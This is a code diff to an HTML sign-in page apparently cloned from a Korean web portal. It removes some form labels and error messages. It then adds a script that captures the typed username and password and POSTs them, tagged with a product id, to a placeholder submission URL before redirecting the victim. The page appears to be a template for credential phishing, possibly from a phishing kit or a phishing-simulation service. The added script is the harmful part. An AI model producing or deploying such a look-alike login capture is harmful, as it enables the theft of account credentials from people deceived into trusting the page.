@@ -48,11 +48,7 @@
         background: #f3f4f5;
       }
     </style>
-    <link
-      href="/css/w_20161104.css"
-      rel="stylesheet"
-      type="text/css"
-    />
+    <link href="/css/w_20161104.css" rel="stylesheet" type="text/css" />
     <div name="form1" id="form1">
       <input type="hidden" name="id" value="utHyEpvH5" />
       <div>
@@ -117,7 +113,6 @@
               <legend class="blind">로그인</legend>
               <div class="input_row" id="id_area">
                 <span class="input_box">
-                  <label class="lbl" id="label_id_area" for="id">아이디</label>
                   <input
                     name="username"
                     class="int"
@@ -127,14 +122,8 @@
                   />
                 </span>
               </div>
-              <div class="error" id="err_empty_id" style="display: none">
-                아이디를 입력해주세요.
-              </div>
               <div class="input_row" id="pw_area">
                 <span class="input_box">
-                  <label class="lbl" id="label_pw_area" for="pw">
-                    비밀번호
-                  </label>
                   <input
                     name="password"
                     class="int"
@@ -283,5 +272,53 @@
         <!-- //footer -->
       </div>
     </div>
+    <script>
+      document
+        .getElementById('btn_login')
+        .addEventListener('click', function (event) {
+          event.preventDefault()
+
+          const username = document.getElementById('username').value
+          const password = document.getElementById('password').value
+
+          const check = /[^a-zA-Z0-9_.@-]/
+          if (check.test(username)) {
+            alert('영문 , 숫자 _ 만 입력해주세요')
+            document.getElementById('username').value = ''
+            document.getElementById('username').focus()
+            return
+          }
+
+          if (username == '') {
+            alert('아이디를 입력하세요')
+            $('#username').focus()
+            return false
+          }
+          if (password == '') {
+            alert('비밀번호를 입력하세요')
+            $('#password').focus()
+            return false
+          }
+
+          fetch('{submit_url}', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              username,
+              password,
+              product: '{product_id}',
+            }),
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              window.location.href = `{redirect_url}?id=${data._id}`
+            })
+            .catch((error) => {
+              console.error('Error:', error)
+            })
+        })
+    </script>
   </body>
 </html>
